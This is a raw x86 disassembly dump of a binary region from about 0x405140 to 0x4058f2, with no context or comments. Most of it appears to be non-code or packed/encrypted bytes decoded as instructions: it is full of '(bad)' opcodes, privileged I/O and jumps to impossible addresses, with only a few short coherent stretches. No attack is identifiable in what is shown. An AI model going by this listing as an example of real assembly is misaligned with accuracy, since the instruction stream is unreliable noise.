  405140:	add    edx,DWORD PTR [eax-0x1a]
  405143:	or     al,0x7f
  405145:	sbb    edx,DWORD PTR [esi]
  405147:	(bad)  
  405148:	cs ret 0xcdb5
  40514c:	gs clc 
  40514e:	mov    eax,0x4adbf421
  405153:	in     eax,0x95
  405155:	adc    eax,0x2a3f29b3
  40515a:	dec    esp
  40515b:	stc    
  40515c:	aam    0x4d
  40515e:	loop   0x4051aa
  405160:	bound  esi,QWORD PTR [edx]
  405162:	jae    0x405132
  405164:	xchg   edx,eax
  405165:	pop    es
  405166:	aas    
  405167:	pop    edi
  405168:	xchg   edx,eax
  405169:	mov    ebx,0xbe8f2013
  40516e:	cmc    
  40516f:	sbb    ah,BYTE PTR [edx+0x10]
  405172:	dec    DWORD PTR [ecx-0x3977503d]
  405178:	mov    bh,0x59
  40517a:	(bad)  
  40517b:	popf   
  40517c:	test   edx,0x52e44792
  405182:	dec    ebx
  405183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405185:	retf   0x1ee8
  405188:	stos   DWORD PTR es:[edi],eax
  405189:	adc    BYTE PTR [ecx-0x10],bh
  40518c:	sti    
  40518d:	and    DWORD PTR [ebx],ebx
  40518f:	pop    eax
  405190:	imul   ebx,DWORD PTR [eax+eax*1],0xffffffb0
  405194:	xchg   esp,eax
  405195:	inc    edi
  405196:	aas    
  405197:	std    
  405198:	scas   al,BYTE PTR es:[edi]
  405199:	jo     0x4051ec
  40519b:	sub    BYTE PTR [edx+0x6c7cb0c],dh
  4051a1:	add    BYTE PTR [ebp+0x2e],0x1c
  4051a5:	loopne 0x405223
  4051a7:	stos   BYTE PTR es:[edi],al
  4051a8:	mov    dh,0xe5
  4051aa:	add    ecx,DWORD PTR [edx+0x20ddec49]
  4051b0:	sbb    edx,ebx
  4051b2:	rcr    DWORD PTR [edi-0x3c023514],cl
  4051b8:	call   0x204bc71d
  4051bd:	pushf  
  4051be:	leave  
  4051bf:	dec    edx
  4051c0:	in     eax,dx
  4051c1:	or     al,0x66
  4051c3:	fwait
  4051c4:	mov    edi,0x3dbcb9a
  4051c9:	cmc    
  4051ca:	popa   
  4051cb:	and    BYTE PTR [eax],0x77
  4051ce:	popf   
  4051cf:	jo     0x4051a2
  4051d1:	and    eax,0xd1d24653
  4051d6:	cmp    BYTE PTR [esi],dh
  4051d8:	xacquire xchg BYTE PTR [ebp-0xfaa1436],ah
  4051df:	mov    al,0xac
  4051e1:	push   0xffffff99
  4051e3:	sub    edi,DWORD PTR [eax+ebx*4+0x2586fc82]
  4051ea:	add    DWORD PTR [ecx-0x7a14589a],eax
  4051f0:	cmp    cl,BYTE PTR [esp+ebp*1+0x75b3545c]
  4051f7:	lods   eax,DWORD PTR ds:[esi]
  4051f8:	jno    0x4051cf
  4051fa:	arpl   WORD PTR [esi+0xa],bx
  4051fd:	in     eax,dx
  4051fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051ff:	or     esi,DWORD PTR fs:[edx]
  405202:	mov    cl,0xc8
  405204:	inc    ebx
  405205:	bound  ebp,QWORD PTR [esi+esi*8+0x37cce672]
  40520c:	xor    esp,edx
  40520e:	out    dx,al
  40520f:	cmp    dh,BYTE PTR [ebp+0x35]
  405212:	sbb    esi,DWORD PTR [esi-0xd]
  405215:	sub    edx,edi
  405217:	or     al,0xf0
  405219:	sub    eax,0x37069be8
  40521e:	fidiv  WORD PTR [ebx+0x77]
  405221:	jb     0x4051ce
  405223:	aaa    
  405224:	mov    edi,0x1b023ff5
  405229:	adc    DWORD PTR [edx+eax*4-0x3d],eax
  40522d:	add    esp,DWORD PTR [edi]
  40522f:	hlt    
  405230:	sahf   
  405231:	mov    eax,0xa2f7e093
  405236:	cli    
  405237:	mov    cl,0x46
  405239:	stc    
  40523a:	and    al,0x49
  40523c:	ss jp  0x4051c6
  40523f:	push   0x330f53d
  405244:	data16 (bad) 
  405246:	(bad)  
  405247:	cdq    
  405248:	push   ecx
  405249:	push   0x24
  40524b:	jl     0x40527f
  40524d:	inc    eax
  40524e:	push   cs
  40524f:	add    al,0x3
  405251:	xor    al,0xb3
  405253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405254:	xlat   BYTE PTR ds:[ebx]
  405255:	add    DWORD PTR [edx-0x1b],esi
  405258:	or     ebp,DWORD PTR [edx-0x106d84b3]
  40525e:	mov    dh,0xf8
  405260:	xchg   edi,eax
  405261:	and    eax,0x359dd0ed
  405266:	in     eax,dx
  405267:	les    edx,FWORD PTR [ecx+0x69]
  40526a:	adc    BYTE PTR [edx-0x3a],dl
  40526d:	mov    bl,0x7b
  40526f:	add    bl,BYTE PTR [ebx-0x4]
  405272:	inc    esi
  405273:	jbe    0x4052db
  405275:	push   cs
  405276:	cwde   
  405277:	std    
  405278:	dec    ecx
  405279:	(bad)  
  40527a:	xchg   edx,eax
  40527b:	out    dx,eax
  40527c:	(bad)  
  40527d:	xor    al,0x7d
  40527f:	and    bh,dl
  405281:	in     eax,0x29
  405283:	mul    BYTE PTR [eax]
  405285:	mov    esp,0xed3d9399
  40528a:	mov    esi,0x44a83ddc
  40528f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405290:	call   0x6fc5c340
  405295:	push   DWORD PTR [esi+0x20]
  405298:	std    
  405299:	loop   0x40524e
  40529b:	adc    eax,DWORD PTR [edx+0x31c7b7d0]
  4052a1:	stc    
  4052a2:	xor    al,0x8b
  4052a4:	outs   dx,DWORD PTR ds:[esi]
  4052a5:	imul   ebp,DWORD PTR [esi+0x7c],0x66
  4052a9:	xchg   edi,eax
  4052aa:	jo     0x40525a
  4052ac:	mov    WORD PTR [esi],gs
  4052ae:	fld    DWORD PTR [edx+0x445eb65b]
  4052b4:	jnp    0x4052b5
  4052b6:	cs pusha 
  4052b8:	mov    bh,0xed
  4052ba:	mov    BYTE PTR [edi+0x1e],ch
  4052bd:	push   ecx
  4052be:	push   0xfb576e42
  4052c3:	mov    al,ds:0x86c0f4e7
  4052c8:	push   0xffffffe3
  4052ca:	loope  0x405256
  4052cc:	mov    ebx,0x73e099e3
  4052d1:	mov    DWORD PTR [ebp+0x6cc62670],ecx
  4052d7:	push   0xffffffa8
  4052d9:	xchg   DWORD PTR [ebp-0x48],esp
  4052dc:	add    ecx,DWORD PTR [edx]
  4052de:	push   esi
  4052df:	(bad)  
  4052e1:	push   esp
  4052e2:	cmp    ch,BYTE PTR [ecx+0x54]
  4052e5:	sub    ecx,edx
  4052e7:	and    eax,0x666ae4e3
  4052ec:	retf   0x6070
  4052ef:	and    DWORD PTR [esi+0x17],esp
  4052f2:	retf   
  4052f3:	push   edi
  4052f4:	sbb    eax,0x484356ca
  4052f9:	push   ds
  4052fa:	jmp    0x405308
  4052fc:	daa    
  4052fd:	mov    ds:0x92f72502,al
  405302:	pop    ebx
  405303:	mov    bl,BYTE PTR [edi+0x1902bc3]
  405309:	jne    0x40537f
  40530b:	bound  ecx,QWORD PTR [ebx+0x495255cd]
  405311:	dec    ecx
  405312:	cwde   
  405313:	sar    BYTE PTR [ebp+ebp*1+0x57753a2a],cl
  40531a:	and    ebx,ebp
  40531c:	shl    BYTE PTR [eax+0x16],0x2f
  405320:	fstp   DWORD PTR [edx+0x5c318af7]
  405326:	or     eax,0x34535a9e
  40532b:	aam    0xca
  40532d:	js     0x4052f7
  40532f:	jp     0x4052ee
  405331:	jg     0x40535c
  405333:	mov    ds:0xc996d7fe,eax
  405338:	adc    ah,cl
  40533a:	jge    0x40530e
  40533c:	mov    BYTE PTR [ecx-0x5a],ch
  40533f:	inc    ebx
  405340:	jno    0x405387
  405342:	xchg   esp,eax
  405343:	std    
  405344:	add    BYTE PTR [eax-0x77],ch
  405347:	fisttp WORD PTR [edi]
  405349:	scas   al,BYTE PTR es:[edi]
  40534a:	arpl   WORD PTR [esi+0x5e827bcb],bp
  405350:	pusha  
  405351:	fs mov ebp,0x9efb0c43
  405357:	mov    esi,0x1bf41e88
  40535c:	fwait
  40535d:	jge    0x40538e
  40535f:	push   0xf5a9bcf4
  405364:	xchg   ebx,eax
  405365:	and    DWORD PTR [eax+0x7418022],ecx
  40536b:	repnz dec ebx
  40536d:	(bad)  
  40536e:	cmc    
  40536f:	push   0xffffffe0
  405371:	cmp    DWORD PTR [esi+0x4a51be39],ebp
  405377:	dec    edi
  405378:	ds es xchg ecx,eax
  40537b:	retf   0x8def
  40537e:	push   cs
  40537f:	aaa    
  405380:	push   edi
  405381:	and    BYTE PTR [ecx-0x10594367],cl
  405387:	inc    ebp
  405388:	inc    ecx
  405389:	xchg   esp,eax
  40538a:	ret    
  40538b:	int3   
  40538c:	pop    ecx
  40538d:	add    edx,DWORD PTR [ebx+ecx*4]
  405390:	mov    WORD PTR [ebp-0x7df03a67],cs
  405396:	sahf   
  405397:	pop    edi
  405398:	dec    esp
  405399:	ss add al,0x8d
  40539c:	ds jle 0x405338
  40539f:	mov    esi,0x52be8b73
  4053a4:	sbb    al,0x87
  4053a6:	int    0x48
  4053a8:	jb     0x4053e1
  4053aa:	push   edx
  4053ab:	and    al,0x20
  4053ad:	test   bl,dl
  4053af:	outs   dx,BYTE PTR ds:[esi]
  4053b0:	mov    eax,0xf680c23c
  4053b5:	stos   DWORD PTR es:[edi],eax
  4053b6:	(bad)  
  4053b7:	fcomp  DWORD PTR [ebx+0x23d6ac36]
  4053bd:	stc    
  4053be:	inc    edi
  4053bf:	dec    ecx
  4053c0:	add    ebx,DWORD PTR [edx-0x6233c442]
  4053c6:	mov    ebx,0x99fb1ff
  4053cb:	mov    gs,WORD PTR [ebp-0x74]
  4053ce:	xor    BYTE PTR [eax+0x3ab02d82],bh
  4053d4:	adc    DWORD PTR ds:0xdaae9540,ecx
  4053da:	and    BYTE PTR [ebp+0x3e],al
  4053dd:	xor    ebp,ebp
  4053df:	pusha  
  4053e0:	jp     0x405369
  4053e2:	dec    esi
  4053e3:	es push es
  4053e5:	data16 into 
  4053e7:	call   0x3005bdf9
  4053ec:	cmp    ecx,DWORD PTR [ebx+0x2e20b7c3]
  4053f2:	aad    0x30
  4053f4:	sti    
  4053f5:	or     esi,DWORD PTR [ebx+esi*2]
  4053f8:	jne    0x4053e0
  4053fa:	and    al,0x7c
  4053fc:	lods   eax,DWORD PTR ds:[esi]
  4053fd:	inc    edx
  4053fe:	xchg   ebp,eax
  4053ff:	dec    esp
  405400:	sub    ebx,edi
  405402:	repnz push esi
  405404:	(bad)  
  405405:	out    0x7c,al
  405407:	sbb    DWORD PTR [eax+0x27],0xffffffa8
  40540b:	jle    0x405416
  40540d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40540e:	sub    esp,ecx
  405410:	jl     0x4053e4
  405412:	mov    eax,ds:0xbbb5b062
  405417:	jnp    0x40541b
  405419:	dec    ebx
  40541a:	or     eax,0x34fb379d
  40541f:	pushf  
  405420:	int    0xe5
  405422:	mov    eax,0x1a0c36b9
  405427:	mov    bh,0x7f
  405429:	dec    edx
  40542a:	stos   BYTE PTR es:[edi],al
  40542b:	pushf  
  40542c:	lahf   
  40542d:	out    dx,eax
  40542e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40542f:	(bad)  
  405430:	sub    al,bh
  405432:	retf   0xbd1f
  405435:	in     eax,dx
  405436:	mov    edi,0xf720bd13
  40543b:	adc    ebx,DWORD PTR [ebx]
  40543d:	pop    ds
  40543e:	out    0xeb,eax
  405440:	(bad)
  405443:	or     dh,BYTE PTR [eax-0x555def7c]
  405449:	in     al,0x82
  40544b:	or     BYTE PTR [eax-0x6c],al
  40544e:	retf   
  40544f:	sbb    ecx,esi
  405451:	dec    edx
  405452:	xor    al,0x88
  405454:	test   eax,0x52c33658
  405459:	cmp    eax,0xa417528f
  40545e:	inc    edx
  40545f:	pop    es
  405460:	mov    ch,0xeb
  405462:	pop    es
  405463:	sbb    ebp,DWORD PTR [edx+edi*4-0x585331c3]
  40546a:	push   es
  40546b:	into   
  40546c:	lock dec edi
  40546e:	mov    eax,ds:0x68c1d8cb
  405473:	in     al,dx
  405474:	jno    0x40544e
  405476:	mov    ?,WORD PTR [edi]
  405478:	mov    al,ds:0x14499fea
  40547d:	add    dh,dh
  40547f:	scas   eax,DWORD PTR es:[edi]
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	in     al,dx
  4054a9:	jg     0x40543e
  4054ab:	lahf   
  4054ac:	adc    BYTE PTR [edi],dh
  4054ae:	jo     0x405520
  4054b0:	stos   BYTE PTR es:[edi],al
  4054b1:	jle    0x405523
  4054b3:	jo     0x405508
  4054b5:	or     ebx,esp
  4054b7:	out    0x11,eax
  4054b9:	(bad)  
  4054ba:	hlt    
  4054bb:	mov    ebx,ecx
  4054bd:	call   0xb2cc:0xe66f45be
  4054c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054c5:	mov    bh,0xae
  4054c7:	imul   ebp,DWORD PTR [eax],0xffffffd3
  4054ca:	lods   al,BYTE PTR ds:[esi]
  4054cb:	std    
  4054cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054cd:	repnz shrd esi,esi,0x9f
  4054d2:	push   0x23
  4054d4:	cld    
  4054d5:	ret    
  4054d6:	sub    eax,0xfb2906dd
  4054db:	inc    edi
  4054dc:	mov    esi,0x9f1e495f
  4054e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054e2:	pop    edx
  4054e3:	aam    0x20
  4054e5:	mov    al,ds:0xa0aa9de1
  4054ea:	pop    ss
  4054eb:	cmp    eax,0x8b93dde8
  4054f0:	js     0x405511
  4054f2:	mov    dl,0xb5
  4054f4:	jmp    0x92c96315
  4054f9:	xchg   edx,eax
  4054fa:	xchg   ebx,eax
  4054fb:	sub    ah,bl
  4054fd:	push   0x47b5bd9
  405502:	imul   esp,DWORD PTR [edx+0x6ddffd0],0xde9a65cf
  40550c:	push   0xffffffd3
  40550e:	sub    BYTE PTR [esi+ebx*1],bh
  405511:	enter  0x2f15,0x94
  405515:	out    dx,al
  405516:	or     al,0xd3
  405519:	retf   0x2334
  40551c:	rcr    bl,cl
  40551e:	scas   eax,DWORD PTR es:[edi]
  40551f:	out    dx,al
  405520:	sub    DWORD PTR [ebx-0x6a],esi
  405523:	push   edx
  405524:	addr16 cli 
  405526:	or     ah,ch
  405528:	jno    0x40555c
  40552a:	call   0x2b82bce9
  40552f:	scas   eax,DWORD PTR es:[edi]
  405530:	ins    DWORD PTR es:[edi],dx
  405531:	xchg   ebp,eax
  405532:	jae    0x40554a
  405534:	jns    0x4054dd
  405536:	jp     0x4055ab
  405538:	jne    0x405595
  40553a:	cli    
  40553b:	dec    esp
  40553c:	fnsetpm(287 only) 
  40553e:	(bad)  
  40553f:	enter  0x1dad,0xd5
  405543:	ret    0x46eb
  405546:	cmp    dl,dl
  405548:	ja     0x405566
  40554a:	jo     0x40552d
  40554c:	mov    ebp,0x48ca4de3
  405551:	xchg   edx,eax
  405552:	out    0x7f,al
  405554:	pushf  
  405555:	outs   dx,BYTE PTR ds:[esi]
  405556:	out    0xa4,eax
  405558:	ret    
  405559:	aaa    
  40555a:	xor    edx,eax
  40555c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40555d:	int3   
  40555e:	jbe    0x40553c
  405560:	push   0x7f
  405562:	mov    ?,WORD PTR [ebx+0xc]
  405565:	fsub   DWORD PTR [esi+0x4d]
  405568:	sub    esi,edi
  40556a:	and    BYTE PTR [eax],bh
  40556c:	or     BYTE PTR [edx],bh
  40556e:	add    eax,0xdb2f501a
  405573:	imul   edi,DWORD PTR [eax-0x20],0xdcc60dae
  40557a:	jl     0x4055e4
  40557c:	pop    edx
  40557d:	mov    dh,0xa9
  40557f:	cmp    BYTE PTR [eax],0xa5
  405582:	sbb    DWORD PTR [edx-0x62],0xffffffef
  405586:	xchg   DWORD PTR [edx],ebp
  405588:	into   
  405589:	mov    bh,0x32
  40558b:	shr    DWORD PTR [esi-0x6e],cl
  40558e:	mul    DWORD PTR [eax-0x50e38df3]
  405594:	jg     0x405520
  405596:	dec    ebx
  405597:	cmp    BYTE PTR [edx-0x42fe3458],dh
  40559d:	mov    BYTE PTR [edi],al
  40559f:	push   eax
  4055a0:	sub    eax,0xdf8265ce
  4055a5:	mov    cl,0xb8
  4055a7:	mov    cl,0x24
  4055a9:	or     dh,BYTE PTR [ebx]
  4055ab:	ins    DWORD PTR es:[edi],dx
  4055ac:	xlat   BYTE PTR ds:[ebx]
  4055ad:	mov    BYTE PTR [ebp+0x7efdfa96],dh
  4055b3:	test   eax,0x3f85eb12
  4055b8:	jmp    0x40562f
  4055ba:	gs (bad) 
  4055bc:	lahf   
  4055bd:	outs   dx,BYTE PTR ds:[esi]
  4055be:	cmc    
  4055bf:	daa    
  4055c0:	dec    ebx
  4055c1:	jecxz  0x405558
  4055c3:	(bad)  
  4055c4:	enter  0x99,0xf3
  4055c8:	cmp    al,0xfe
  4055ca:	sbb    al,0xa2
  4055cc:	push   eax
  4055cd:	push   cs
  4055ce:	fsub   QWORD PTR [eax-0x80]
  4055d1:	xor    al,0x30
  4055d4:	mov    dh,0xe2
  4055d6:	or     dl,BYTE PTR [edi+0x1c]
  4055d9:	test   BYTE PTR [edx+0x28],ah
  4055dc:	sbb    eax,0xb7ad6e23
  4055e1:	push   ebp
  4055e2:	iret   
  4055e3:	jo     0x405579
  4055e5:	xchg   edi,esi
  4055e7:	or     edx,DWORD PTR ds:0x8e5eacdc
  4055ed:	xchg   esp,eax
  4055ee:	sbb    dl,BYTE PTR [esi-0x57]
  4055f1:	cli    
  4055f2:	adc    DWORD PTR [esi+edx*2],edx
  4055f5:	ret    0x14f2
  4055f8:	xchg   ebx,eax
  4055f9:	sub    al,0xd5
  4055fb:	add    al,0x51
  4055fd:	pop    eax
  4055fe:	js     0x405665
  405600:	lahf   
  405601:	sbb    BYTE PTR [edx+ecx*2],bl
  405604:	ja     0x4055f9
  405606:	scas   al,BYTE PTR es:[edi]
  405607:	sub    ebp,edx
  405609:	lods   al,BYTE PTR ds:[esi]
  40560a:	into   
  40560b:	inc    edx
  40560c:	std    
  40560d:	sbb    ebx,ebp
  40560f:	aas    
  405610:	sbb    ebx,ecx
  405612:	fbstp  TBYTE PTR [ebp+0x51]
  405615:	and    BYTE PTR [eax-0x40],al
  405618:	(bad)  
  40561a:	stc    
  40561b:	dec    eax
  40561c:	adc    ebx,eax
  40561e:	inc    ecx
  40561f:	call   0x2484fd80
  405624:	arpl   WORD PTR gs:[esi+0x3f142df0],si
  40562b:	out    0xb6,eax
  40562d:	inc    edx
  40562e:	push   es
  40562f:	mov    ecx,0xff9848
  405634:	popf   
  405635:	mov    ch,BYTE PTR [edi+0x1d]
  405638:	push   0xffffffdf
  40563a:	fimul  DWORD PTR [ebx+edi*1]
  40563d:	lods   al,BYTE PTR ds:[esi]
  40563e:	ror    BYTE PTR [esi+0x5b],1
  405641:	inc    esi
  405642:	xchg   esp,eax
  405643:	dec    ebx
  405644:	mov    ch,0xaa
  405646:	jmp    0x4055f1
  405648:	fisub  WORD PTR [esi]
  40564a:	and    BYTE PTR [ecx+0x58],bl
  40564d:	sahf   
  40564e:	xchg   ebx,eax
  40564f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405650:	inc    ecx
  405651:	push   ebp
  405652:	cwde   
  405653:	ja     0x40567f
  405655:	fiadd  DWORD PTR ds:0xc87b1e9
  40565b:	and    al,0xf8
  40565d:	mov    eax,ds:0xef143ae7
  405662:	inc    esp
  405663:	pshufw mm0,QWORD PTR [edi+eiz*4+0x7e],0x9a
  405669:	cli    
  40566a:	aam    0x42
  40566c:	xchg   BYTE PTR [eax],dl
  40566e:	jg     0x405613
  405670:	into   
  405671:	pop    ebp
  405672:	adc    DWORD PTR [edi-0x28],edx
  405675:	push   ebp
  405676:	aad    0xcf
  405678:	adc    al,0x69
  40567a:	fdiv   QWORD PTR [edx]
  40567c:	or     ch,BYTE PTR ds:0x7850bcce
  405682:	cmc    
  405683:	(bad)  
  405684:	xchg   esi,eax
  405685:	mov    edx,es
  405687:	pop    ds
  405688:	test   al,0x90
  40568a:	(bad)  
  40568b:	sbb    esi,eax
  40568d:	cdq    
  40568e:	scas   al,BYTE PTR es:[edi]
  40568f:	gs cmc 
  405691:	push   cs
  405692:	pop    ebx
  405693:	xchg   DWORD PTR [ebx+0x7b],ebx
  405696:	push   0x55
  405698:	test   al,0x14
  40569a:	js     0x405708
  40569c:	sbb    eax,0xe4a64d49
  4056a1:	fisubr WORD PTR [eax]
  4056a3:	adc    al,0xfe
  4056a5:	dec    ecx
  4056a6:	mov    esp,0x340fe315
  4056ab:	shl    BYTE PTR [ecx-0x34c4404a],0x7e
  4056b2:	repnz fst DWORD PTR [esi-0x34]
  4056b6:	lds    esi,FWORD PTR [ecx]
  4056b8:	jge    0x405642
  4056ba:	sub    DWORD PTR [edi-0x117f7d57],ebp
  4056c0:	push   eax
  4056c1:	push   esp
  4056c2:	pop    esp
  4056c3:	es jo  0x405682
  4056c6:	rol    BYTE PTR [eax+esi*8],1
  4056c9:	loop   0x40572a
  4056cb:	lea    ebx,[edx-0x76]
  4056ce:	rcr    ecx,1
  4056d0:	shl    cl,1
  4056d2:	fisub  DWORD PTR [edi]
  4056d4:	fucomp st(7)
  4056d6:	mov    bh,0x25
  4056d8:	loopne 0x405759
  4056da:	es fst st(2)
  4056dd:	out    0x18,eax
  4056df:	fcmovne st,st(4)
  4056e1:	stc    
  4056e2:	add    eax,0x9f404f5e
  4056e7:	test   eax,0xfd141ae4
  4056ec:	mov    edi,0xaa51977e
  4056f1:	jne    0x405686
  4056f3:	jb     0x4056d6
  4056f5:	in     eax,dx
  4056f6:	in     al,dx
  4056f7:	call   0x375e:0x44324c6f
  4056fe:	shl    BYTE PTR [edx+0x26],cl
  405701:	xor    BYTE PTR [ecx],0x15
  405704:	in     eax,0xfa
  405706:	mov    bl,BYTE PTR ss:[ebp+0x7da90a04]
  40570d:	or     edi,DWORD PTR [eax]
  40570f:	pop    eax
  405710:	sbb    al,0x84
  405712:	push   DWORD PTR [ebp+0x14]
  405715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405716:	push   es
  405717:	dec    ebp
  405718:	pop    esi
  405719:	popf   
  40571a:	xor    al,BYTE PTR [edi]
  40571c:	test   DWORD PTR [edi-0x6a33abab],esp
  405722:	inc    ecx
  405723:	dec    ebp
  405724:	outs   dx,BYTE PTR ds:[esi]
  405725:	and    DWORD PTR [esi+eiz*1+0x1b],edi
  405729:	xchg   edx,eax
  40572a:	mov    esi,0xf41a0673
  40572f:	inc    eax
  405730:	(bad)  
  405731:	xchg   ebp,eax
  405732:	outs   dx,DWORD PTR ds:[esi]
  405733:	in     al,dx
  405734:	nop
  405735:	mov    ebp,DWORD PTR [eax-0x34]
  405738:	push   esp
  405739:	sub    bl,BYTE PTR [esi]
  40573b:	adc    edx,eax
  40573d:	loopne 0x4056c6
  40573f:	mov    BYTE PTR [ebp-0x7f],dh
  405742:	and    DWORD PTR gs:[edx+0x31d83bac],ebx
  405749:	hlt    
  40574a:	cwde   
  40574b:	pop    ds
  40574c:	into   
  40574d:	inc    edi
  40574e:	sbb    DWORD PTR [ebx-0x6a],ecx
  405751:	inc    ebx
  405752:	int    0xb2
  405754:	dec    ebp
  405755:	add    cl,0x9c
  405758:	mov    ds:0xc3fbe590,al
  40575d:	sub    DWORD PTR [eax-0xe43977],ebp
  405763:	dec    edx
  405764:	inc    edi
  405765:	jle    0x40578c
  405767:	mov    dl,BYTE PTR [ecx-0x48f0ae0d]
  40576d:	add    eax,0x42fd86
  405772:	and    eax,DWORD PTR ds:0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x54da91be],eax
  405790:	call   0x7075a273
  405795:	jo     0x405741
  405797:	jle    0x405809
  405799:	jo     0x40575f
  40579b:	pop    ebx
  40579c:	cmp    bl,BYTE PTR [ebp-0x26]
  40579f:	std    
  4057a0:	retf   0x923b
  4057a3:	dec    ebp
  4057a4:	cdq    
  4057a5:	xchg   ebp,eax
  4057a6:	loope  0x4057f2
  4057a8:	loopne 0x4057d0
  4057aa:	sub    bl,dh
  4057ac:	jno    0x4057ab
  4057ae:	ds push ebp
  4057b0:	xor    BYTE PTR [ebx],ah
  4057b2:	add    DWORD PTR [ecx],0x56ab6341
  4057b8:	pusha  
  4057b9:	mov    esp,0x9b581869
  4057be:	pusha  
  4057bf:	jecxz  0x40575e
  4057c1:	daa    
  4057c2:	mov    edi,DWORD PTR [esi]
  4057c4:	jb     0x4057c3
  4057c6:	(bad)  
  4057c7:	pop    ebp
  4057c8:	in     al,dx
  4057c9:	add    esp,DWORD PTR [ebp+0x38]
  4057cc:	ja     0x405751
  4057ce:	cmc    
  4057cf:	push   edi
  4057d0:	(bad)  
  4057d1:	imul   eax,DWORD PTR [edx+ecx*1],0x0
  4057d5:	cmp    bh,BYTE PTR [esi-0x43db6a70]
  4057db:	fidiv  DWORD PTR cs:[esi-0x4d]
  4057df:	mov    ebp,0xa220a337
  4057e4:	xchg   bh,ah
  4057e6:	test   ebp,ecx
  4057e8:	sub    dh,BYTE PTR [edi-0x21]
  4057eb:	adc    BYTE PTR [ebx],ch
  4057ed:	push   ebp
  4057ee:	mov    eax,ds:0xda538747
  4057f3:	push   edi
  4057f4:	or     ah,bl
  4057f6:	adc    BYTE PTR [edx],dl
  4057f8:	sbb    ch,BYTE PTR [ebx]
  4057fa:	sub    eax,0x25be0d6a
  4057ff:	push   esi
  405800:	cmp    DWORD PTR [ebx+0x6b841d52],ecx
  405806:	cmp    eax,0x8047000e
  40580b:	in     eax,0x3b
  40580d:	pop    ebp
  40580e:	add    BYTE PTR ds:0x41446272,ah
  405814:	sub    al,0xe3
  405816:	cmc    
  405817:	pop    ax
  405819:	pop    ebx
  40581a:	sub    eax,0x8b406148
  40581f:	push   ecx
  405820:	cli    
  405821:	mov    al,ds:0x8b0ccd42
  405826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405827:	mov    eax,0x268ad458
  40582c:	arpl   WORD PTR [edi+ecx*4+0x8460c57],bx
  405833:	mov    edx,0x71499a23
  405838:	push   ds
  405839:	xchg   ecx,eax
  40583a:	mov    ds:0xe4286802,eax
  40583f:	jp     0x40585f
  405841:	pop    ecx
  405842:	imul   ebx,DWORD PTR [edx+0x3c656ded],0x18
  405849:	cmp    DWORD PTR [edx+0x43],ebx
  40584c:	mov    al,0xc9
  40584e:	xlat   BYTE PTR ds:[ebx]
  40584f:	ror    BYTE PTR [ecx+0x30be2aff],0x3a
  405856:	jb     0x405844
  405858:	jmp    0x2cc3:0x513022e0
  40585f:	push   cs
  405860:	jle    0x4058b9
  405862:	fcmovb st,st(3)
  405864:	or     ebp,0xffffff9a
  405867:	std    
  405868:	pop    esp
  405869:	inc    ebx
  40586a:	ror    BYTE PTR [edx-0x3],1
  40586d:	xchg   edx,eax
  40586e:	lods   eax,DWORD PTR ds:[esi]
  40586f:	pop    es
  405870:	push   0x1deb52b1
  405875:	retf   0x1beb
  405878:	pushf  
  405879:	pop    es
  40587a:	push   cs
  40587b:	(bad)  
  40587d:	popa   
  40587e:	gs push ebx
  405880:	xchg   ebx,eax
  405881:	xor    ebx,DWORD PTR [esi]
  405883:	and    ebp,0xc495743b
  405889:	pop    ebp
  40588a:	xor    al,0x7e
  40588c:	pop    esi
  40588d:	retf   
  40588e:	ret    
  40588f:	mov    ecx,0x81af6486
  405894:	iret   
  405895:	xchg   ebp,eax
  405896:	inc    edi
  405897:	cdq    
  405898:	and    bh,BYTE PTR [ebx+0x1470af64]
  40589e:	inc    BYTE PTR [ebx+0x3a]
  4058a1:	into   
  4058a2:	jae    0x4058b5
  4058a4:	(bad)
  4058a7:	xor    al,0xa5
  4058a9:	(bad)  
  4058aa:	cmp    BYTE PTR [edi+0x46],dl
  4058ad:	cdq    
  4058ae:	cmp    al,0x61
  4058b0:	(bad)  
  4058b1:	push   ebx
  4058b2:	int    0x1d
  4058b4:	add    ch,BYTE PTR [ecx-0x5a98425f]
  4058ba:	push   ebx
  4058bb:	outs   dx,DWORD PTR ds:[esi]
  4058bc:	jg     0x405864
  4058be:	xor    bh,BYTE PTR [ecx+0x8a28fa8]
  4058c4:	mov    ebx,0x3ff0652
  4058c9:	lds    edi,FWORD PTR [esi]
  4058cb:	scas   al,BYTE PTR es:[edi]
  4058cc:	adc    dh,bl
  4058ce:	in     al,dx
  4058cf:	cld    
  4058d0:	or     al,0x42
  4058d2:	ss clc 
  4058d4:	fwait
  4058d5:	sbb    ebx,0xffffffc0
  4058d8:	ret    0x5cd1
  4058db:	adc    edi,ecx
  4058dd:	mov    esp,0x8b4332f9
  4058e2:	cmp    eax,0x241e65d4
  4058e7:	pop    eax
  4058e8:	sbb    DWORD PTR [ebp+0x5],eax
  4058eb:	mov    al,0xf9
  4058ed:	mov    ebx,0x6570fc38
  4058f2:	sti    
